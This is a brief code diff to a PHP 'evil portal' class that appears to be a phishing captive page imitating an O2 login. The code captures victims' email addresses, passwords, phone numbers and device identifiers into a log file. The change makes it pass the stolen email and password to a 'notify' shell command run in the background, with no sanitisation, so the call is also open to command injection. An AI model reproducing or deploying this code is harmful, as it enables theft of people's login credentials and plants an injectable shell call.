@@ -47,8 +47,7 @@ class MyPortal extends Portal
             $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
             $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
             file_put_contents("$dir/evilportal-logs/o2-login.txt", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nmobile: {$mobile}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
-
-            exec("notify $email' - '$pwd");
+            $this->execBackground("notify $email' - '$pwd");
         }
         // handle form input or other extra things there
 
